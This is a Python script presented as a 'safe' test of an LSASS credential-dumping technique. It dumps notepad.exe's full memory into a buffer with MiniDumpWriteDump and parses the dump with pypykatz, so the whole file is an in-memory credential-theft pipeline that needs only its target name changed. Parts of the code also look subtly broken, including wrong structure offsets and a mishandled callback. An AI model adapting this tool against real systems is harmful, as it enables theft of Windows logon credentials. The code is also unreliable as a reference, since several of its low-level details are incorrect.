#!/usr/bin/env python3
"""
LSASS Dump Technique Test - Targeting Notepad.exe (Safe for Testing)
"""

import ctypes
import ctypes.wintypes
import io
import time
import pyperclip
from pypykatz import pypykatz
from ctypes import wintypes

# ====================== CONSTANTS ======================
PROCESS_ALL_ACCESS = 0x1F0FFF
MINIDUMP_WITH_FULL_MEMORY = 2

kernel32 = ctypes.windll.kernel32
dbghelp = ctypes.windll.dbghelp

def find_process_by_name(name="notepad.exe"):
    """Find process by name"""
    snapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)  # TH32CS_SNAPPROCESS
    entry = ctypes.create_string_buffer(304)
    ctypes.cast(entry, ctypes.POINTER(ctypes.c_ulong))[0] = 304

    if not kernel32.Process32First(snapshot, ctypes.byref(entry)):
        kernel32.CloseHandle(snapshot)
        return None

    while kernel32.Process32Next(snapshot, ctypes.byref(entry)):
        proc_name = ctypes.cast(entry, ctypes.POINTER(ctypes.c_char * 260))[0].value.decode('utf-8', errors='ignore').lower()
        if name.lower() in proc_name:
            pid = ctypes.cast(entry, ctypes.POINTER(ctypes.c_ulong))[5]
            kernel32.CloseHandle(snapshot)
            return pid
    kernel32.CloseHandle(snapshot)
    return None


def dump_process_to_memory(pid):
    """Dump any process to memory buffer"""
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        print("[-] Failed to open process")
        return None

    buffer = io.BytesIO()

    def minidump_callback(CallbackParam, CallbackInput, CallbackOutput):
        data = (ctypes.c_char * CallbackInput.Contents.WriteMemory.MemorySize).from_address(
            CallbackInput.Contents.WriteMemory.MemoryBaseAddress
        )
        buffer.write(data)
        return True

    callback_info = MINIDUMP_CALLBACK_INFORMATION = type('MINIDUMP_CALLBACK_INFORMATION', (ctypes.Structure,), {
        '_fields_': [("CallbackRoutine", ctypes.c_void_p), ("CallbackParam", ctypes.c_void_p)]
    })()

    callback_info.CallbackRoutine = ctypes.cast(
        ctypes.CFUNCTYPE(wintypes.BOOL, wintypes.PVOID, wintypes.PVOID, wintypes.PVOID)(minidump_callback), 
        ctypes.c_void_p
    )

    success = dbghelp.MiniDumpWriteDump(
        h_process, pid, None, MINIDUMP_WITH_FULL_MEMORY,
        None, None, ctypes.byref(callback_info)
    )

    kernel32.CloseHandle(h_process)
    return buffer.getvalue() if success else None


def main():
    print("[*] Looking for Notepad.exe...")
    pid = find_process_by_name("notepad.exe")
    
    if not pid:
        print("[-] Notepad.exe not found! Please open Notepad and try again.")
        print("    Tip: Run this script while Notepad is open.")
        return

    print(f"[+] Found Notepad PID: {pid}")

    print("[*] Dumping process to memory...")
    dump_data = dump_process_to_memory(pid)

    if not dump_data:
        print("[-] Dump failed")
        return

    print(f"[+] Dump successful! Size: {len(dump_data) // (1024):,} KB in memory")

    # Try to parse (for demonstration)
    print("[*] Attempting to parse with pypykatz...")
    try:
        # For non-LSASS processes, parsing may not yield credentials, but it tests the pipeline
        katz = pypykatz.parse_minidump_bytes(dump_data)
        print(f"[+] Successfully parsed minidump with pypykatz!")
        print(f"    Logon sessions found: {len(katz.logon_sessions)}")
        
        # Copy dump info to clipboard (metadata)
        info = f"""Process: Notepad.exe
PID: {pid}
Dump Size: {len(dump_data) // (1024)} KB
Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}
Technique: In-Memory MiniDumpWriteDump"""
        
        pyperclip.copy(info)
        print("[+] Process dump metadata copied to clipboard!")
        
    except Exception as e:
        print(f"[-] Parsing error (expected for non-LSASS): {e}")
        pyperclip.copy(f"Dump successful! Size: {len(dump_data)//(1024)} KB")
        print("[+] Dump size info copied to clipboard instead.")


if __name__ == "__main__":
    main()